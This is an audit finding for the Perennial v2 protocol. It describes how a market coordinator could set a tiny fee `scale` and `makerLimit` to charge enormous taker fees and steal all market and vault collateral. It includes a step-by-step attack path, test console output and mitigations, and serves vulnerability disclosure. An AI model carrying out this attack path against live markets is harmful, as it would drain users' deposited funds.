# Market coordinator can steal all market collateral by abusing very low value of `scale`

**Summary**
The README states the following:
> Q: Please list any known issues and explicitly state the acceptable risks for each known issue.
Coordinators are given broad control over the parameters of the markets they coordinate. The protocol parameter is designed to prevent situations where parameters are set to malicious steal funds. If the coordinator can operate within the bounds of reasonable protocol parameters to negatively affect markets we would like to know about it

Market coordinator can set both `makerLimit` and `scale` for `takerFee` at very low amount (like 1), which will charge absurdly high taker proportional fee to existing positions, because proportional fee formula is `change.abs().mul(price).muldiv(change.abs(), scale).mul(fee)`, i.e. the fee is `(order_size)^2 * price * fee` when scale is 1. The same issue is with maker proportional fee and taker adiabatic fee - all of them multiply by order size divided by `scale`.

The only limitation for `scale` setting is that it must be larger than some percentage of `makerLimit` and there is no limitation on `makerLimit`:
```solidity
    UFixed6 scaleLimit = self.makerLimit.div(self.efficiencyLimit).mul(protocolParameter.minScale);
    if (self.takerFee.scale.lt(scaleLimit) || self.makerFee.scale.lt(scaleLimit))
        revert RiskParameterStorageInvalidError();
```
This allows to set any `scale` amount, the `makerLimit` just has to be set to a similar amount, or alternatively `efficiencyLimit` can be set to a huge amount (there is only downside limitation for it), which will make `scaleLimit` very low, allowing very low `scale` values.

Market coordinator can abuse this by opening large maker position (settling it), opening large taker position (unsettled), changing risk parameter `makerLimit` and `scale` to 1, then at the next oracle version the large taker position will be settled using `scale = 1`, charging fees much higher than 100%, putting taker position into huge bad debt, while all makers will have huge profit (larger than market collateral), which coordinator can immediately withdraw from his maker position, stealing all market collateral.

**Root Cause**
The exact root cause is hard to determine here. It might be the lack of risk parameter settings validations: the only `scale` check is against `scaleLimit` calculated from `makerLimit`, but there is no conditions on `makerLimit` itself:
https://github.com/sherlock-audit/2024-08-perennial-v2-update-3/blob/main/perennial-v2/packages/perennial/contracts/types/RiskParameter.sol#L159-L161

On the other hand, it's probably hard to set correct protocol-wide limitation for this, so maybe the issue is with the design of the proportional and adiabatic fees, where the `order_size / scale` multiplication is quite dangerous as it is unlimited.

**Internal pre-conditions**
Coordinator is malicious.

**External pre-conditions**
None.

**Attack Path**
1. Coordinator opens large maker position, settles it
2. Coordinator opens large taker position (but doesn't settle it yet)
3. Coordinator sets risk parameter: `makerLimit = 1`, `takerFee.scale = 1` and `takerFee.propotionalFee` set to max.
4. Coordinator commits oracle version of the taker position, settles maker+taker positions: taker is in huge bad debt, maker is in huge profit (larger than all market collateral)
5. Coordinator withdraws all market collateral

Note: step 1 and 2 are preparation, steps 3-5 can be performed in 1 transaction

Alternatives:
- Setting `takeFee.scale = 1` and `efficiencyLimit` to a very high value.
- All taker trades after the `scale = 1` is set will incur huge fee, so it's possible to have settled taker position before the risk params change, and then close it by liquidation, incuring huge fees. Coordinator doesn't even have to open his own taker position, he can simply liquidate any large existing taker.
- Use adiabatic fees scale instead of taker proportional fees
- Use maker propotional fees (and use only maker accounts)

**Impact**
All market collateral stolen.

Additional impact: if the market is part of any vault, almost all this vault funds can be stolen. This can be done by forcing the vault to re-balance (depositing or withdrawing some amount), which will charge huge fees, making vault's collateral in the market negative. Next re-balance will add more collateral into the market, which can be stolen again, repeated until most vault funds are stolen.

Console output from execution:
```solidity
User collateral (maker)  : 100000000000
UserB collateral (taker) : 100000000000
UserC collateral (honest): 10000000000
After attack
User collateral (maker)  : 1330000000000
UserB collateral (taker) : -1130000000000
UserC collateral (honest): 10000000000
```

Notice: honest user deposits 10K, coordinator deposits 100K+100K, after attack coordinator has collateral of 1.33M (much more than total collateral of 210K), which he can withdraw.

**Mitigation**
Depends on protocol design choice. Possibilities I see:
- Make `scale` validation more strict: possibly use `max(makerLimit, currentGlobalPosition.long,short,maker )` instead of `makerLimit` in `scaleLimit` calculation, so that `scale` should obey not just `makerLimit` percentage, but also max from currently opened positions. Additionally validate `efficiencyLimit` max value (limit to 1?)
- Change proportional and adiabatic fee formulas for something more percentage-based so that there is a strict max fee limit
- Add hard percentage cap on proportional and adiabatic fees (currently proportional fee = 1% doesn't mean that it's max 1% - it's actually unlimited, 1% is some arbitrary number not telling anything about real percentage charged, so it makes sense to still have a cap for it)
